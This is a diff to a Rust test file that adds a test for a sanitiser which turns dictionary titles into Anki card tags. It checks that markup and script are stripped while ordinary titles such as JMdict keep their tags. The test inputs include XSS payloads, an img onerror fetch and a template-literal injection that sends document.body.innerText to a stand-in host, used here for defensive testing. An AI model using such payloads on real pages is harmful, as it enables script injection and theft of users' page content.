@@ -1429,6 +1429,41 @@ fn concurrent_checks_initialize_the_journal_without_schema_races() {
 }
 
 #[test]
+fn dictionary_tags_never_carry_markup_or_script() {
+    // A hostile title or frequency value: Lapis puts `{{Tags}}` in a template literal, then HTML.
+    assert_eq!(
+        dictionary_tag("<img src=x onerror=\"fetch('http://127.0.0.1:8898/d')\">"),
+        "img_src=x_onerror=fetch(http://127.0.0.1:8898/d)"
+    );
+    assert_eq!(
+        dictionary_tag("${fetch('//x/'+document.body.innerText)}`"),
+        "fetch(//x/+document.body.innertext)"
+    );
+    assert_eq!(dictionary_tag("a\\` &amp; b"), "a_amp;_b");
+    assert_eq!(dictionary_tag("<>\"'`${}"), "");
+    // Real titles and values keep the tags they always had.
+    assert_eq!(
+        dictionary_tag("Jitendex.org [2026-08-11]"),
+        "jitendex.org_[2026-08-11]"
+    );
+    assert_eq!(dictionary_tag("JMdict (English)"), "jmdict_(english)");
+    assert_eq!(dictionary_tag("大辞林 第四版"), "大辞林_第四版");
+    assert_eq!(dictionary_tag("JPDBv2㋕ ★★"), "jpdbv2㋕_★★");
+
+    // A source whose whole title is unsafe adds no tag.
+    let mut req = request(prefs(1));
+    let mut mapping = req.preferences.mappings["Basic"].clone();
+    mapping.tags = vec![];
+    mapping.tag_dictionaries = vec![1];
+    req.dictionary_sources = vec![DictionaryTagSource {
+        id: 1,
+        title: "<>".into(),
+        values: None,
+    }];
+    assert!(card_tags(&req, &mapping).is_empty());
+}
+
+#[test]
 fn frequency_tiers_are_card_tags_and_original_glossaries_reach_anki() {
     let service = Service::new(basic);
     let directory = tempdir().unwrap();
